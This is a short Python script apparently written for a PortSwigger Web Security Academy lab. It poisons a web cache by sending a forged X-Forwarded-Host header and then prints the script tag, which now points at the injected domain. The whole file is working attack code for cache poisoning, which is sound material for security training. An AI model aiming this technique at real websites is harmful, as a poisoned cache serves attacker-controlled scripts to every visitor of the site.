import requests
import sys
from bs4 import BeautifulSoup
site = 'acba1f771e43dec8c093649a003300bb.web-security-academy.net'
s = requests.Session()
site_url = f'https://{site}'
OdinId= 'madler'
headers = {
   'X-Forwarded-Host' : f'{OdinId}.net'
}
resp = s.get(site_url, headers=headers)
if resp.headers['X-Cache'] == 'miss':
    soup = BeautifulSoup(resp.text,'html.parser')
    script_src = soup.find('script')
    print(f'Poisoned script tag is {script_src}')